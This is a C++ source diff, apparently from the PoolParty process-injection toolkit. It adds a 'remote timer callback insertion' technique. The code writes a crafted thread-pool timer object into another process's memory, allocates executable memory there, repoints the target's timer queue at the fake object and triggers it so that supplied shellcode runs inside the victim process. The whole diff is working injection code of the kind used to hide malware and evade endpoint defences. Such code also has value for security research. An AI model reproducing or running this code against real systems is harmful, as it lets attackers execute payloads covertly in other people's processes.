@@ -340,3 +340,69 @@ void RemoteDirectCallbackInsertion::SetupExecution() const
 	w_ZwSetIoCompletion(*m_p_hIoCompletion, RemoteDirectAddress, 0, 0, 0);
 	BOOST_LOG_TRIVIAL(info) << "Queued a packet to the IO completion port of the target process worker factory";
 }
+
+RemoteTimerCallbackInsertion::RemoteTimerCallbackInsertion(DWORD dwTargetPid, unsigned char* cShellcode, SIZE_T szShellcodeSize)
+	: PoolParty{ dwTargetPid, cShellcode, szShellcodeSize }
+{
+}
+
+// TODO: Improve logging, readability, comments
+void RemoteTimerCallbackInsertion::SetupExecution() const
+{
+	auto p_hWorkerFactory = this->GetTargetThreadPoolWorkerFactoryHandle();
+	auto WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation(*p_hWorkerFactory);
+
+	const auto Pool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid, WorkerFactoryInformation.StartParameter);
+	BOOST_LOG_TRIVIAL(info) << "Read target process's TP_POOL structure into the current process";
+
+	const auto pTpTimer = w_CreateThreadpoolTimer(static_cast<PTP_TIMER_CALLBACK>(m_ShellcodeAddress), nullptr, nullptr);
+	BOOST_LOG_TRIVIAL(info) << "Created TP_TIMER structure associated with the shellcode";
+
+	const auto Timeout = -10000000;
+
+	pTpTimer->Work.CleanupGroupMember.Pool = static_cast<PFULL_TP_POOL>(WorkerFactoryInformation.StartParameter);
+	pTpTimer->DueTime = Timeout;
+	pTpTimer->WindowStartLinks.Key = Timeout;
+	pTpTimer->WindowEndLinks.Key = Timeout;
+	BOOST_LOG_TRIVIAL(info) << "Performed TpSetTimerEx actions on TP_TIMER";
+
+	const auto RemoteTpTimerAddress = static_cast<PFULL_TP_TIMER>(w_VirtualAllocEx(*m_p_hTargetPid, sizeof(FULL_TP_TIMER), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));
+	BOOST_LOG_TRIVIAL(info) << boost::format("Allocated TP_TIMER memory in the target process: %p") % RemoteTpTimerAddress;
+	w_WriteProcessMemory(*m_p_hTargetPid, RemoteTpTimerAddress, pTpTimer, sizeof(FULL_TP_TIMER));
+	BOOST_LOG_TRIVIAL(info) << "Written the specially crafted TP_TIMER structure to the target process";
+	
+	// Initialize the remote TP_TIMER WindowStart and WindowsEnd sibilings and children list entries
+	auto TpTimerWindowsStartChildren = &RemoteTpTimerAddress->WindowStartLinks.Children;
+	auto TpTimerWindowsEndChildren = &RemoteTpTimerAddress->WindowEndLinks.Children;
+	w_WriteProcessMemory(*m_p_hTargetPid, &RemoteTpTimerAddress->WindowStartLinks.Children.Flink, &TpTimerWindowsStartChildren, sizeof(TpTimerWindowsStartChildren));
+	w_WriteProcessMemory(*m_p_hTargetPid, &RemoteTpTimerAddress->WindowStartLinks.Children.Blink, &TpTimerWindowsStartChildren, sizeof(TpTimerWindowsStartChildren));
+	w_WriteProcessMemory(*m_p_hTargetPid, &RemoteTpTimerAddress->WindowEndLinks.Children.Flink, &TpTimerWindowsEndChildren, sizeof(TpTimerWindowsEndChildren));
+	w_WriteProcessMemory(*m_p_hTargetPid, &RemoteTpTimerAddress->WindowEndLinks.Children.Blink, &TpTimerWindowsEndChildren, sizeof(TpTimerWindowsEndChildren));
+
+	const auto TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
+	const auto TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
+
+	w_WriteProcessMemory(*m_p_hTargetPid, 
+		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.RelativeQueue.WindowStart.Root,
+		(PVOID)&TpTimerWindowStartLinks, 
+		sizeof(TpTimerWindowStartLinks));
+	w_WriteProcessMemory(*m_p_hTargetPid, 
+		&pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.RelativeQueue.WindowEnd.Root, 
+		(PVOID)&TpTimerWindowEndLinks, 
+		sizeof(TpTimerWindowEndLinks));
+	BOOST_LOG_TRIVIAL(info) << "Modified the target process's TP_POOL tiemr queue list entry to point to the specially crafted TP_TIMER";
+
+	// Trigger TppTimerQueueExpiration by setting the thread pool's timer queue to expire
+	const auto p_hThreadpoolTimer = w_DuplicateHandle(
+		*m_p_hTargetPid,
+		Pool->TimerQueue.RelativeQueue.Timer,
+		GetCurrentProcess(),
+		NULL,
+		FALSE,
+		DUPLICATE_SAME_ACCESS);
+
+	LARGE_INTEGER ulDueTime{ 0 };
+	ulDueTime.QuadPart = Timeout;
+	T2_SET_PARAMETERS Parameters{ 0 };
+	w_NtSetTimer2(*p_hThreadpoolTimer, &ulDueTime, 0, &Parameters);
+}
